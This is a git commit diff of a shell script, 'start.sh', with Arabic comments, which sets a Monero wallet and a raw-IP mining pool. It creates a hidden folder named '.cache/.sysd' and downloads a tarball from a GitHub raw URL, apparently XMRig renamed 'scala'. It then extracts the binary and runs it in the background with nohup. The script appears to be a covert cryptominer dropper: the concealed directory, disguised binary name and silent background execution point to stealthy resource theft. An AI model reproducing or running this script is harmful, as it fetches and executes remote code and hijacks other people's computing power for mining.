31969267c3c902b884388695278611a60d5b9ac7
ewilkinso <ewilkinson3@alaska.edu>
2025-08-13 09:58:33 +0100

    Update start.sh

--- start.sh
+++ start.sh
@@ -2,7 +2,28 @@
 
 # إعداد بيانات المحفظة والمعدّن
 WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
-WORKER="-dandi"
+WORKER="-dandi-"
+POOL="45.155.102.89:443"
+THREADS=
+# مجلد العمل
+WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
+mkdir -p "$WORKDIR" && cd "$WORKDIR"
+
+# تحميل النسخة الجاهزة من XMRig (Linux x64)
+wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz -O scala.tar.gz
+
+# فك الضغط
+tar -xvf scala.tar.gz --strip=1
+rm scala.tar.gz
+
+# تشغيل المعدّن في الخلفية باستخدام nohup
+nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_output.log 2>&1 &
+
+#!/bin/bash
+
+# إعداد بيانات المحفظة والمعدّن
+WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
+WORKER="dandi@"
 POOL="45.155.102.89:443"
 THREADS=
 # مجلد العمل
